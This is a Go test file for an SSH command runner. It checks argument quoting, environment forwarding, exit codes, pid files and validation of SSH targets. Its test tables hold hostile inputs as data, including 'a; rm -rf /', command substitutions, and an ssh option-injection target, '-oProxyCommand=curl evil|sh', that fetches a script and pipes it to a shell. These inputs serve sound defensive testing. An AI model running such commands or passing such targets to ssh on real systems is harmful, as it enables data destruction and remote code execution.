package runner

import (
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// hostileArgs are strings a shell would act on if the quoting let it.
var hostileArgs = []struct {
	name string
	arg  string
}{
	{"plain", "hello"},
	{"single quote", `it's`},
	{"double quote", `say "hi"`},
	{"dollar", `$HOME`},
	{"braced variable", `${PATH}`},
	{"command substitution", "$(id -u)"},
	{"backtick", "`id -u`"},
	{"backslash", `a\b`},
	{"trailing backslash", `a\`},
	{"newline", "one\ntwo"},
	{"tab", "one\ttwo"},
	{"glob", "*.go"},
	{"brace expansion", "{a,b}"},
	{"semicolon", "a; rm -rf /"},
	{"pipe", "a | b"},
	{"ampersand", "a && b"},
	{"redirect", "a > b"},
	{"subshell", "(exit 3)"},
	{"only quotes", `'''`},
	{"unicode", "unicode"},
	{"empty", ""},
	{"spaces", "   "},
	{"newline and quote", "a'\nb"},
}

func TestSSHRemoteScriptSurvivesTheShell(t *testing.T) {
	for _, tc := range hostileArgs {
		t.Run(tc.name, func(t *testing.T) {
			script := sshRemoteScript([]string{"printf", "%s", tc.arg})
			out, err := exec.Command("sh", "-c", script).Output()
			require.NoError(t, err)
			assert.Equal(t, tc.arg, string(out), "argument was mangled by the shell")
		})
	}
}

func TestSSHRemoteScriptKeepsArgumentsSeparate(t *testing.T) {
	script := sshRemoteScript([]string{"printf", "[%s]", "one two", "three"})
	out, err := exec.Command("sh", "-c", script).Output()
	require.NoError(t, err)
	assert.Equal(t, "[one two][three]", string(out))
}

func TestSSHRemoteCommandForwardsEnvironment(t *testing.T) {
	// A value that is itself shell syntax proves the entry travels as data.
	script := sshRemoteCommand("", "", []string{`DATS_X=$(echo pwned); "'`},
		[]string{"sh", "-c", `printf %s "$DATS_X"`})
	out, err := exec.Command("sh", "-c", script).Output()
	require.NoError(t, err)
	assert.Equal(t, `$(echo pwned); "'`, string(out))
}

func TestSSHRemoteCommandPreservesExitStatus(t *testing.T) {
	script := sshRemoteCommand("", "", nil, []string{"sh", "-c", "exit 7"})
	err := exec.Command("sh", "-c", script).Run()
	var exit *exec.ExitError
	require.ErrorAs(t, err, &exit)
	assert.Equal(t, 7, exit.ExitCode())
}

func TestSSHRemoteCommandRecordsThePid(t *testing.T) {
	dir := t.TempDir()
	script := sshRemoteCommand(dir, "dats-1-1", nil, []string{"printf", "%s", "ran"})
	out, err := exec.Command("sh", "-c", script).Output()
	require.NoError(t, err)
	assert.Equal(t, "ran", string(out))

	recorded, err := exec.Command("cat", filepath.Join(dir, "dats-1-1")).Output()
	require.NoError(t, err)
	assert.Regexp(t, `^[0-9]+\n?$`, string(recorded), "the pid file must hold the shell pid")
}

// TestSSHRemoteCommandPidFailureIsNotTheExitStatus pins the ";" that closes the recording block.
func TestSSHRemoteCommandPidFailureIsNotTheExitStatus(t *testing.T) {
	script := sshRemoteCommand("/proc/nonexistent/dats", "id", nil, []string{"printf", "%s", "ran"})
	out, err := exec.Command("sh", "-c", script).Output()
	require.NoError(t, err)
	assert.Equal(t, "ran", string(out))
}

func TestValidateSSHTarget(t *testing.T) {
	valid := []string{
		"host",
		"user@host",
		"user@host.example.com",
		"192.0.2.1",
		"[2001:db8::1]",
		"fe80::1%eth0",
		"build-box",
		"user.name@host",
	}
	for _, target := range valid {
		t.Run("valid/"+target, func(t *testing.T) {
			assert.NoError(t, ValidateSSHTarget(target))
		})
	}

	// A target that ssh reads as an option runs a command on THIS machine.
	invalid := []struct {
		name   string
		target string
	}{
		{"empty", ""},
		{"proxy command option", "-oProxyCommand=curl evil|sh"},
		{"short option", "-F/tmp/evil"},
		{"lone dash", "-"},
		{"space", "host evil"},
		{"semicolon", "host;id"},
		{"quote", `host'`},
		{"backslash", `host\evil`},
		{"dollar", "host$X"},
		{"newline", "host\nevil"},
		{"slash", "../host"},
	}
	for _, tc := range invalid {
		t.Run("invalid/"+tc.name, func(t *testing.T) {
			assert.Error(t, ValidateSSHTarget(tc.target))
		})
	}
}

func TestSSHArgvShape(t *testing.T) {
	argv := sshArgv("build@box", "/tmp/dats-ssh-x/abcd1234", "exec 'printf' 'hi'")

	assert.Equal(t, "ssh", argv[0])
	assert.Contains(t, argv, "-T", "a pty would merge stderr into stdout and rewrite newlines")
	assert.Contains(t, argv, "BatchMode=yes", "a prompt would hang a run nobody is watching")
	assert.Contains(t, argv, "LogLevel=ERROR", "the known-hosts warning would pollute captured stderr")
	assert.Contains(t, argv, "ControlPath=/tmp/dats-ssh-x/abcd1234")

	// The target is followed by exactly one element: the whole remote script.
	require.Len(t, argv, len(argv))
	assert.Equal(t, "build@box", argv[len(argv)-2])
	assert.Equal(t, "exec 'printf' 'hi'", argv[len(argv)-1])
}

func TestSSHArgvWithoutControlPathOmitsMultiplexing(t *testing.T) {
	argv := sshArgv("box", "", "true")
	for _, arg := range argv {
		assert.NotContains(t, arg, "ControlPath")
		assert.NotContains(t, arg, "ControlMaster")
	}
}

// TestSSHControlPathStaysUnderTheSocketLimit pins the reason the socket is named by a hash.
func TestSSHControlPathStaysUnderTheSocketLimit(t *testing.T) {
	long := "user@" + strings.Repeat("a", 200) + ".example.com"
	got := sshControlPath("/tmp/dats-ssh-1234567890", long)
	assert.Less(t, len(got), sshControlPathMax)
}

func TestSSHControlPathIsStablePerTarget(t *testing.T) {
	a := sshControlPath("/tmp/x", "build@box")
	b := sshControlPath("/tmp/x", "build@box")
	c := sshControlPath("/tmp/x", "other@box")
	assert.Equal(t, a, b, "one target must reuse one socket")
	assert.NotEqual(t, a, c, "two targets must not share a socket")
}
